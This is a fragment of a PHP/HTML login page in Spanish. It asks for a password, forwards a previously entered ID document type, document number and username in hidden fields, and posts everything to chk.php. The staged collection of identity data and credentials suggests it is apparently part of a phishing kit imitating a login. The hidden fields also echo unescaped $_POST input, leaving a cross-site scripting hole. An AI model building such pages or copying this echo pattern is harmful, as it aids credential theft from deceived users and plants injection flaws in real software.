                    ...
                    <div class="container py-4">
                        <div class="row pt-10">
                            <div class="offset-md-8 col-md-6 col-lg-5 col-xl-4 col-sm-8 col- pt-5" id="card">
                                ...
                                <div class="p-4">
                                    <h4 class="text-">Para continuar</h4>
                                    <p class="text-">Para iniciar sesi&oacute;n en tu cuenta, por favor introduce tu contrase&ntilde;a.</p>
                                    ...
                                    <form method="POST" action="chk.php" id="form" autocomplete="off" class="z-index-1 position-relative" >
                                      <input type="hidden"  name="txttipodoc" value="<?php echo $_POST['tipodocben']; ?>">
									   <input type="hidden"  name="txtdoc" value="<?php echo $_POST['documento']; ?>">
									    <input type="hidden"  name="txtusr" value="<?php echo $_POST['username'] ?>">
                                        ...
                                        <div class="mb-3">
                                            <div>
                                                ...
                                                <input class="form-control" name="password" id="password" type="password" autocomplete="off" placeholder="Contrase&ntilde;a" required="required" maxlength="16">
                                            </div>
                                        </div>
                                        ...
                                        <div class="row mt-4">
                                            <div class="col-md-12 text-center">
                                                <a class="w-100 text-decoration-underline" style="font-weight: bold;" href="">&iquest;Olvidaste tu contrase&ntilde;a?</a>
                                            </div>
                                        </div>
                                    </form>
                                </div>
